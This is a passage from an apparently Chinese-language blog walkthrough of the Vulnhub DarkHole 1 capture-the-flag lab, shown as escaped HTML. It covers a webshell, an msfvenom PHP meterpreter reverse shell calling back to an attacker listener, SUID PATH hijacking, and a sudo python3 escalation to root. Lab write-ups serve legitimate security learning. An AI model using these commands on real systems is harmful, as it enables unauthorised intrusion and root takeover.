?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传的文件保存在了\u003ccode\u003e/upload\u003c/code\u003e路径，测试能否使用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image72.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以正常包含\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用蚁🗡连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image73.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e我们先反弹\u003ccode\u003eshell\u003c/code\u003e ，靶机自带的\u003ccode\u003enc\u003c/code\u003e不支持\u003ccode\u003e-e\u003c/code\u003e ,所以我们需要上传反弹\u003ccode\u003eshell\u003c/code\u003e脚本然后包含\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e生成脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p php/meterpreter/reverse_tcp lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e lport=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -f raw \u003e getshell.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: php \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e1115\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在蚁🗡将脚本上传\u003ccode\u003eupload\u003c/code\u003e文件夹里\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image74.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e打开\u003ccode\u003emsf\u003c/code\u003e监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload php/meterpreter/reverse_tcp\npayload =\u003e php/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e\nlhost =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlport =\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e网页访问上传的脚本文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%201/image75.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e39927\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.184\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55480\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-08 \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e:08 +0800\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输入shell获得shell命令行\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ whoami\nwww-data\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n$ uname -a\nLinux darkhole \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找利用点\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eSUID权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/polkit-agent-helper-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/pkexec\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/home/john/toto\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/home/john/toto\u003c/code\u003e 这个一看就不对劲\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e数据库配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ cat database.php\n\u0026#x3C;?php\n$connect = new mysqli(\u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'john'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'john'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'darkhole'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以尝试密码碰撞\u003ccode\u003essh\u003c/code\u003e，但是密码错误\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e来到\u003ccode\u003e/home/john/\u003c/code\u003e ，下有四个文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ ls\nfile.py\npassword\ntoto\nuser.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是除了\u003ccode\u003etoto\u003c/code\u003e有读和执行权限，别的都没有权限，前面\u003ccode\u003esuid\u003c/code\u003e也搜索出了\u003ccode\u003etoto\u003c/code\u003e ，尝试利用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e利用\u003ccode\u003etoto\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e因为不知道有什么作用，我们直接执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ ./toto\nuid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(john) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们通过蚁🗡下载该文件下来，使用\u003ccode\u003eIDA\u003c/code\u003e反编译看看写了啥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e __fastcall main(\u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e argc, const char **argv, const char **envp)\n{\n  setuid(0x3E9u);\n  setgid(0x3E9u);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e system(\u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置\u003ccode\u003eUID\u003c/code\u003e然后设置\u003ccode\u003eGID\u003c/code\u003e最后输出\u003ccode\u003eID\u003c/code\u003e命令\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e劫持环境变量\u003c/p\u003e\n\u003cp\u003e因为他会执行\u003ccode\u003eid\u003c/code\u003e ，所以我们修改环境变量让他执行id的时候执行\u003ccode\u003e/bin/bash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ echo \u003cspan class=\"hljs-string\"\u003e\"/bin/bash\"\u003c/span\u003e \u003e /tmp/\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n$ chmod \u003cspan class=\"hljs-number\"\u003e777\u003c/span\u003e /tmp/\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n$ export PATH=/tmp:$PATH \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e$ export PATH=/tmp:PATH\u003c/code\u003e  设置\u003ccode\u003e/tmp\u003c/code\u003e为环境变量的开头，那样就可以一开始就去\u003ccode\u003e/tmp\u003c/code\u003e寻找 \u003ccode\u003eid\u003c/code\u003e 也就是\u003ccode\u003e/bin/bash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e执行\u003ccode\u003etoto\u003c/code\u003e ，获得\u003ccode\u003ejohn\u003c/code\u003e的shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ ./toto\njohn@darkhole:/home/john$\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获得\u003ccode\u003ejohn\u003c/code\u003e的用户后查看之前没权限看的文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003epassword\u003c/code\u003e 是\u003ccode\u003ejohn\u003c/code\u003e的密码，我们用它去\u003ccode\u003essh\u003c/code\u003e登录\u003ccode\u003ejohn\u003c/code\u003e获得更好的用户交互\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejohn@darkhole:~$ cat password \nroot123\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003efile.py\u003c/code\u003e是空的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eohn@darkhole:~$ cat file.py \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e 一个\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejohn@darkhole:~$ cat user.txt \nDarkHole{You_Can_DO_It}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找利用点\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejohn@darkhole:~$ sudo -l\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e john: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e john on darkhole:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser john may run the following commands on darkhole:\n    (root) /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3 /home/john/file.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以使用\u003ccode\u003eroot\u003c/code\u003e权限执行\u003ccode\u003efile.py\u003c/code\u003e文件，哦豁，可以提权了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e编辑\u003ccode\u003efile.py\u003c/code\u003e文件，将提权语句写入\u003ccode\u003efile.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eehco \u003cspan class=\"hljs-string\"\u003e\"import os;os.system('/bin/bash');\"\u003c/span\u003e \u003e\u003e file.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003esudo\u003c/code\u003e权限执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejohn@darkhole:~$ sudo /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3 /home/john/file.py \nroot@darkhole:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得root！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@darkhole:~\u003cspan class=\"hljs-comment\"\u003e# cat root.txt \u003c/span\u003e\nDarkHole{You_Are_Legend}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - DarkHole 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DarkHole: 1\n\n https://www.vulnhub.com/entry/darkhole-1,724/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`184`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1...."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubDarkHole 1"},"buildId":"HqVXsZTlrfHPzeS89Gdgh","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>